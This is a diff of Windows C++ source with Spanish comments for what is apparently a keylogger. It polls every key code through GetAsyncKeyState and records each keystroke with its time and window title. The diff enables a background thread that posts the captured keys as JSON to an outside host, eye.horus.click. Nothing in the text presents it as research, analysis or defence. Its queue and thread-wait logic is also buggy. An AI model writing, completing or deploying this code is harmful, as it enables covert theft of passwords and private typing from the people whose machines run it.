@@ -391,18 +391,24 @@ bool TeclasPulsadas(int tecla) {
 
 //Implementación del hilo
 DWORD WINAPI Send_to_WS(LPVOID lpParam) {
-	/*
-	Queue* QUEUE = (Queue*)lpParam;
+	
+	queue<tecla> *QueueParam = (queue<tecla>*)lpParam;
+
 	for (int i = 10; i > 0; i--) {
-		type_key* key = Dequeue(QUEUE);
+		type_key key = QueueParam->front();
+
+		int diferenciador = 0;
+
 		string body = "{"
-			"\"Time\":\"" + key->tiempo + "\","
-			"\"Window\":\"" + key->ventana + "\","
-			"\"Key\":\"" + key->key + "\""
+			"\"Time\":\"" + key.tiempo + "\","
+			"\"Window\":\"" + key.ventana + "\","
+			"\"Key\":\"" + key.key + "\""
 			"}";
-		string ruta = "/evento/" + str_key.nombre;
+		string ruta = "/evento/" + key.nombre + to_string(++diferenciador);
 		HttpsWebRequestPost("eye.horus.click", ruta, body);
-	}*/
+		//Sleep(100);
+		//QueueParam->pop();
+	}
 	return 1;
 }
 //--Implementación del hilo--
@@ -420,39 +426,13 @@ int main() {
 	cout << "----------------------------------------------------------------------------\n";
 
 	while (TRUE) {
-		Sleep(10);
 		for (key = 8; key <= 255; key++) {
 			if (GetAsyncKeyState(key) == -32767) {
-
 				if (TeclasPulsadas(key) == FALSE) {
 					str_key.key = key;
 
 					QUEUE.push(str_key);
 
-					//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
-					/*
-					if (QUEUE.size() == 10) {
-						//Variables para el funcionamiento del proceso
-						DWORD dwThreadId;
-						HANDLE hThread;
-
-						hThread = CreateThread(
-							NULL,
-							0,
-							Send_to_WS,
-							&QUEUE,
-							0,
-							&dwThreadId
-						);
-
-						if (hThread == NULL)
-							cout << "Error al crear el proceso";
-						else {
-							WaitForSingleObject(hThread, INFINITE);
-							CloseHandle(hThread);
-						}
-					}
-					*/
 					//Impresión de depuración
 					cout << str_key.key + "\t";
 					cout << str_key.ventana + "\t";
@@ -460,6 +440,35 @@ int main() {
 					cout << str_key.nombre + "\n";
 
 				}
+
+				//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
+				if (QUEUE.size() >= 10) {
+					//Variables para el funcionamiento del proceso
+					DWORD dwThreadId;
+					HANDLE hThread;
+
+					hThread = CreateThread(
+						NULL,
+						0,
+						Send_to_WS,
+						&QUEUE,
+						0,
+						&dwThreadId
+					);
+
+					if (hThread == NULL)
+						cout << "Error al crear el proceso";
+					else {
+						
+						DWORD thread_signal = WaitForSingleObject(hThread, 100);
+						if((thread_signal != WAIT_FAILED) || (thread_signal != WAIT_TIMEOUT))
+							QUEUE.pop();
+						
+						//WaitForSingleObject(hThread, 0);
+						CloseHandle(hThread);
+					}
+				}
+
 			}
 		}
 	}
